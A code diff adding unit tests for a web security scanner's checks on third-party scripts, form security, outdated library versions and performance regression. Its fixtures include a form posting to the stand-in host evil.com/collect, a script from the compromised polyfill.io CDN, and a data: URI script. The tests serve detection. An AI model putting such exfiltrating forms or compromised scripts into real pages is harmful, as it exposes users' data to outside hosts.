@@ -375,3 +375,188 @@ describe("checkAPISecurity", () => {
     expect(findings.length).toBe(0);
   });
 });
+
+// ────────────────────────────────────────────
+// 15. Third-party script risk scoring
+// ────────────────────────────────────────────
+
+import {
+  checkThirdPartyScripts,
+  checkFormSecurity,
+  checkDependencyVersions,
+  checkPerformanceRegression,
+} from "@/lib/security";
+
+describe("checkThirdPartyScripts", () => {
+  it("detects HTTP third-party script as CRITICAL", () => {
+    const html = `<script src="http://cdn.example.com/lib.js"></script>`;
+    const findings = checkThirdPartyScripts(html, "https://myapp.com");
+    expect(findings.some((f) => f.code === "THIRD_PARTY_SCRIPT_HTTP")).toBe(true);
+    expect(findings.find((f) => f.code === "THIRD_PARTY_SCRIPT_HTTP")?.severity).toBe("CRITICAL");
+  });
+
+  it("detects known compromised CDN as CRITICAL", () => {
+    const html = `<script src="https://polyfill.io/v3/polyfill.min.js"></script>`;
+    const findings = checkThirdPartyScripts(html, "https://myapp.com");
+    expect(findings.some((f) => f.code === "THIRD_PARTY_SCRIPT_COMPROMISED_CDN")).toBe(true);
+    expect(findings.find((f) => f.code === "THIRD_PARTY_SCRIPT_COMPROMISED_CDN")?.severity).toBe("CRITICAL");
+  });
+
+  it("detects cdn.polyfill.io as compromised CDN", () => {
+    const html = `<script src="https://cdn.polyfill.io/v3/polyfill.min.js"></script>`;
+    const findings = checkThirdPartyScripts(html, "https://myapp.com");
+    expect(findings.some((f) => f.code === "THIRD_PARTY_SCRIPT_COMPROMISED_CDN")).toBe(true);
+  });
+
+  it("detects data: URI script as HIGH", () => {
+    const html = `<script src="data:text/javascript,alert(1)"></script>`;
+    const findings = checkThirdPartyScripts(html, "https://myapp.com");
+    expect(findings.some((f) => f.code === "THIRD_PARTY_SCRIPT_DATA_URI")).toBe(true);
+    expect(findings.find((f) => f.code === "THIRD_PARTY_SCRIPT_DATA_URI")?.severity).toBe("HIGH");
+  });
+
+  it("does not flag same-domain scripts", () => {
+    const html = `<script src="https://myapp.com/bundle.js"></script>`;
+    const findings = checkThirdPartyScripts(html, "https://myapp.com");
+    expect(findings.length).toBe(0);
+  });
+
+  it("does not flag relative path scripts", () => {
+    const html = `<script src="/static/bundle.js"></script>`;
+    const findings = checkThirdPartyScripts(html, "https://myapp.com");
+    expect(findings.length).toBe(0);
+  });
+
+  it("flags high domain count when more than 10 external domains", () => {
+    const domains = Array.from({ length: 11 }, (_, i) => `cdn${i}.example.com`);
+    const scripts = domains.map((d) => `<script src="https://${d}/lib.js"></script>`).join("\n");
+    const findings = checkThirdPartyScripts(scripts, "https://myapp.com");
+    expect(findings.some((f) => f.code === "THIRD_PARTY_SCRIPT_HIGH_COUNT")).toBe(true);
+    expect(findings.find((f) => f.code === "THIRD_PARTY_SCRIPT_HIGH_COUNT")?.severity).toBe("MEDIUM");
+  });
+});
+
+// ────────────────────────────────────────────
+// 16. Form security analysis
+// ────────────────────────────────────────────
+
+describe("checkFormSecurity", () => {
+  it("detects GET method on API endpoint form as MEDIUM", () => {
+    const html = `<form method="GET" action="/api/search"><input type="text" name="q"></form>`;
+    const findings = checkFormSecurity(html);
+    expect(findings.some((f) => f.code === "FORM_GET_API_ENDPOINT")).toBe(true);
+    expect(findings.find((f) => f.code === "FORM_GET_API_ENDPOINT")?.severity).toBe("MEDIUM");
+  });
+
+  it("detects password field without CSRF token as HIGH", () => {
+    const html = `<form method="POST" action="/login"><input type="password" name="pass"></form>`;
+    const findings = checkFormSecurity(html);
+    expect(findings.some((f) => f.code === "FORM_PASSWORD_NO_CSRF")).toBe(true);
+    expect(findings.find((f) => f.code === "FORM_PASSWORD_NO_CSRF")?.severity).toBe("HIGH");
+  });
+
+  it("does not flag password field when CSRF token present", () => {
+    const html = `<form method="POST" action="/login"><input type="hidden" name="csrf" value="tok"><input type="password" name="pass"></form>`;
+    const findings = checkFormSecurity(html);
+    expect(findings.some((f) => f.code === "FORM_PASSWORD_NO_CSRF")).toBe(false);
+  });
+
+  it("detects form submitting to external domain as HIGH", () => {
+    const html = `<form method="POST" action="https://evil.com/collect"><input type="text"></form>`;
+    const findings = checkFormSecurity(html);
+    expect(findings.some((f) => f.code === "FORM_EXTERNAL_ACTION")).toBe(true);
+    expect(findings.find((f) => f.code === "FORM_EXTERNAL_ACTION")?.severity).toBe("HIGH");
+  });
+
+  it("returns empty for secure form", () => {
+    const html = `<form method="POST" action="/submit"><input type="text" name="data"><input type="hidden" name="_token" value="abc"></form>`;
+    const findings = checkFormSecurity(html);
+    expect(findings.length).toBe(0);
+  });
+
+  it("returns empty for form with no password and POST method", () => {
+    const html = `<form method="POST" action="/search"><input type="text" name="q"></form>`;
+    const findings = checkFormSecurity(html);
+    expect(findings.length).toBe(0);
+  });
+});
+
+// ────────────────────────────────────────────
+// 20. Dependency version risk
+// ────────────────────────────────────────────
+
+describe("checkDependencyVersions", () => {
+  it("detects outdated jQuery 1.x as HIGH", () => {
+    const findings = checkDependencyVersions(["/* jQuery v1.9.1 */", "/* end */", ""]);
+    expect(findings.some((f) => f.code === "DEP_JQUERY_OUTDATED")).toBe(true);
+    expect(findings.find((f) => f.code === "DEP_JQUERY_OUTDATED")?.severity).toBe("HIGH");
+  });
+
+  it("detects outdated jQuery 3.4.x as HIGH", () => {
+    const findings = checkDependencyVersions(["/* jquery v3.4.1 */", ""]);
+    expect(findings.some((f) => f.code === "DEP_JQUERY_OUTDATED")).toBe(true);
+  });
+
+  it("does not flag jQuery 3.5.0", () => {
+    const findings = checkDependencyVersions(["/* jquery v3.5.0 */", ""]);
+    expect(findings.some((f) => f.code === "DEP_JQUERY_OUTDATED")).toBe(false);
+  });
+
+  it("detects outdated React 15.x as MEDIUM", () => {
+    const findings = checkDependencyVersions(["react v15.6.2", ""]);
+    expect(findings.some((f) => f.code === "DEP_REACT_OUTDATED")).toBe(true);
+    expect(findings.find((f) => f.code === "DEP_REACT_OUTDATED")?.severity).toBe("MEDIUM");
+  });
+
+  it("detects outdated Angular 11.x as MEDIUM", () => {
+    const findings = checkDependencyVersions(["angular v11.2", ""]);
+    expect(findings.some((f) => f.code === "DEP_ANGULAR_OUTDATED")).toBe(true);
+  });
+
+  it("detects outdated Lodash as MEDIUM", () => {
+    const findings = checkDependencyVersions(["lodash v4.16.0", ""]);
+    expect(findings.some((f) => f.code === "DEP_LODASH_OUTDATED")).toBe(true);
+    expect(findings.find((f) => f.code === "DEP_LODASH_OUTDATED")?.severity).toBe("MEDIUM");
+  });
+
+  it("does not flag current lodash 4.17.21", () => {
+    const findings = checkDependencyVersions(["lodash v4.17.21", ""]);
+    expect(findings.some((f) => f.code === "DEP_LODASH_OUTDATED")).toBe(false);
+  });
+
+  it("detects Bootstrap 3.x as LOW", () => {
+    const findings = checkDependencyVersions(["bootstrap v3.4.1", ""]);
+    expect(findings.some((f) => f.code === "DEP_BOOTSTRAP_OUTDATED")).toBe(true);
+    expect(findings.find((f) => f.code === "DEP_BOOTSTRAP_OUTDATED")?.severity).toBe("LOW");
+  });
+
+  it("detects Moment.js as LOW", () => {
+    const findings = checkDependencyVersions(["moment v2.29.4", ""]);
+    expect(findings.some((f) => f.code === "DEP_MOMENTJS_DETECTED")).toBe(true);
+    expect(findings.find((f) => f.code === "DEP_MOMENTJS_DETECTED")?.severity).toBe("LOW");
+  });
+
+  it("returns empty for no known libraries", () => {
+    const findings = checkDependencyVersions(["const x = 1 + 1;", ""]);
+    expect(findings.length).toBe(0);
+  });
+
+  it("deduplicates same library across multiple payloads", () => {
+    const payload = "/* jquery v1.9.1 */";
+    const findings = checkDependencyVersions([payload, payload]);
+    const jqueryFindings = findings.filter((f) => f.code === "DEP_JQUERY_OUTDATED");
+    expect(jqueryFindings.length).toBe(1);
+  });
+});
+
+// ────────────────────────────────────────────
+// 18. Performance regression (no-db fallback)
+// ────────────────────────────────────────────
+
+describe("checkPerformanceRegression", () => {
+  it("returns empty array when db is unavailable", async () => {
+    // In CI, DATABASE_URL is not set, so db queries throw. The function catches silently.
+    const findings = await checkPerformanceRegression("non-existent-app-id", 5000);
+    expect(Array.isArray(findings)).toBe(true);
+  });
+});
